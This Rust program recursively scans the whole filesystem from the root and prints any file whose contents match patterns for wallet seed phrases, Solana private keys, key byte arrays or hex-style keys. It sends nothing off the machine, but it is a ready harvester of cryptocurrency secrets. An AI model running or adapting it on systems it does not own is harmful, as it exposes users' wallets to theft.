use std::{fs::{self, File}, io::{Read, Error}, time::Instant};
use regex::Regex;
use walkdir::WalkDir;
use num_format::{Locale, ToFormattedString};

fn main() -> Result<(), Error> {
    // start timer
    let n = Instant::now();
    // constant base path
    const PATH: &str = "/";
    // instantiate counters
    let mut file_count: u64 = 0;
    let mut dir_count: u64 = 0;
    let mut valid_count: u64 = 0;
    let mut match_count: u32 = 0;
    // regex
    let mnemomic_24: Regex = Regex::new(r"^(\w+\s){23}\w+$").unwrap();
    let mnemomic_12: Regex = Regex::new(r"^(\w+\s){11}\w+$").unwrap();
    // let mn: Regex = Regex::new(r"^\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+\s\w+$").unwrap();
    let sol_priv: Regex = Regex::new(r"^[a-zA-Z0-9_]{88}$").unwrap();
    let sol_bytearr: Regex = Regex::new(r"^\[([0-9]+,){63}[0-9]+\]$").unwrap();
    let priv_32: Regex = Regex::new(r"^[a-z0-9_]{32}$").unwrap();
    let priv_64: Regex = Regex::new(r"^[a-z0-9_]{64}$").unwrap();
    // result vector
    let mut results: Vec<String> = Vec::new();
    // start recursive walker
    for entry in WalkDir::new(PATH).follow_links(true).into_iter().filter_map(|entry| entry.ok()) {
        // get path from entry
        let entry_path = entry.path();
        // get metadata to differentiate files & dirs
        let meta = fs::metadata(&entry_path)?;
        // we run this condition 1st
        if meta.is_dir() {
            dir_count += 1;
        }
        // runs only if entry is a file
        if meta.is_file() {
            file_count += 1;
            let mut file = File::open(&entry_path).expect("Unable to open file");
            // instantiate vector only if we can open the file
            let mut c: Vec<u8> = Vec::new();
            // ingest bytes data
            file.read_to_end(&mut c).expect("Unable to read");
            // past here, we have a utf-8 readable file
            if std::str::from_utf8(&c).is_ok() {
                // increment read_count
                valid_count += 1;
                // read file
                let reader: String = String::from(std::str::from_utf8(&c).unwrap());
                // regex assertion
                if (mnemomic_24.is_match(&reader) || mnemomic_12.is_match(&reader) || sol_priv.is_match(&reader) || sol_bytearr.is_match(&reader) || priv_32.is_match(&reader) || priv_64.is_match(&reader)) == true {
                    match_count += 1;
                    println!("{}", &reader);
                    // let res: String = String::from(rc);
                    results.push(reader);
                }
            };
            // iterate over vector values
            // for i in &r {
            //     println!("{}", i);
            // }
        }
    }
    // shadow copy and type casting from u64 to f64
    let n: f64 = n.elapsed().as_secs_f64();
    // Debugging output
    println!(
        "Found {} files in {} directories\nRead {} files, {} matches in {:.2}s",
        file_count.to_formatted_string(&Locale::en), 
        dir_count.to_formatted_string(&Locale::en), 
        valid_count.to_formatted_string(&Locale::en), 
        match_count.to_formatted_string(&Locale::en),
        n
    );
    Ok(())
}